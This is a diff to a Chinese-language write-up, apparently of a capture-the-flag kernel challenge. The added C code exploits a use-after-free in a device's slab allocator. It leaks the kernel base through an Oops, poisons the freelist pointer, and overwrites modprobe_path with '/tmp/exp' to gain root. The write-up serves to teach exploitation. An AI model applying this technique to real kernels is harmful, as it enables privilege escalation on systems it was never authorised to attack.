@@ -94,11 +94,13 @@ oops脚本:<br>
 2、uaf修改next_ptr为非法地址
 3、申请到该非法地址，触发oops
 ```
-oops脚本:<br>
+第二步，根据泄露的地址进行漏洞利用，利用方法为修改slab中的`next_ptr`指向`modprobe_path`，并修改`modprobe_path`的内容。<br>
+这里因为思想的进步，想到了一个可以一个脚本完成所有任务的办法:<br>
+主要利用的思想是：**内核文件交互可以是并发的，内核文件的kheap服务于所有用户；父子进程共享文件描述符的话，即使其中一个进程销毁了，其相应的文件句柄也不会被释放**<br>
 ```c
-    // step 0 : construct `next_ptr = null situation`
-    int fd[8]; // 4096/0x200=8
-    for(int i=0;i<8;i++){
+int main(){
+    int fd[8];
+    for(int i=0;i<8;i++){   //父子进程共享，这样其中一个进程消失也不会被释放
         fd[i] = open_device();
     }
     char buf[1048];
@@ -116,12 +118,55 @@ oops脚本:<br>
     unsigned long long key = *(unsigned long long *)(buf+0xe8);
     key = key ^ 0x4141414141414141;
     *(unsigned long long *)(buf+0xe8) = key;
-    write_slot(fd[0],buf,0x1d0);
+    write_slot(fd[0],buf,0x1d0); // 此时kmem_cache的free_list中，存在 A-> 0XAAAAAAAA 的链表
 
     // step 4: alloc slot
     printf("step4\n");
-    int fd2 = open_device();
-    int fd3 = open_device();
+    victim_fd = open_device();  //此时kmem_cache的free_list中，存在0XAAAAAAAA 的链表
+    int pid = fork();
+    if (pid == 0){
+        int fd3 = open_device(); // saved in cache freelist ，此时分配失败，因为0xAAAAAAAA是无效地址，分配失败后， 链表中仍然是 0xAAAAAAAA
+    }else{
+        int status;
+        waitpid(pid, &status, 0); //等待子进程结束，因为父子进程共享文件描述符，所以子进程销毁后他们也不会被释放，当前 kmem_cache的链表仍然为 0xAAAAAAAA
+        environ_set();
+        //step 0: get kernel_base_addr: via Oops
+        unsigned long long kernel_base_addr = 0;
+        scanf("%llx",&kernel_base_addr);
+        kernel_base_addr = kernel_base_addr - 0x58c20;
+        printf("kernel_addr: %llx\n",kernel_base_addr);
+        unsigned long long modprobe_addr = kernel_base_addr+0x13f4c0-0x100;
+        printf("modprobe_path addr: %llx\n",modprobe_addr);
+        //get kernel_base_addr: via Oops
+        // step 0 : construct `next_ptr = null situation`
+
+        char buf[1048];
+        // step 1: free the chunk -> freelist
+        printf("step1\n");
+        free_slot(victim_fd,buf,0);
+        // step 2: leak the swab(&ptr) ^ random
+        printf("step2\n");
+        memset(buf,0,1048);
+        read_slot(victim_fd,buf,0x1d0);
+        printf("key: %llx\n",*(unsigned long long *)(buf+0xe8));
+    
+        // step 3: change next_ptr -> modprobe
+        printf("step3\n");
+        unsigned long long key = *(unsigned long long *)(buf+0xe8);
+        key = key ^ modprobe_addr ^0x4141414141414141;
+        *(unsigned long long *)(buf+0xe8) = key;
+        write_slot(victim_fd,buf,0x1d0);
+        // step 4: alloc slot
+        printf("step4\n");
+        int fd2 = open_device();
+        int fd3 = open_device();
+        memset(buf,0,0x100);
+        memcpy(buf+0x100,"/tmp/exp\x00",10);
+        write_slot(fd3,buf,0x100+10);
+    
+        get_flag();
+    }
+
 ```
 
 
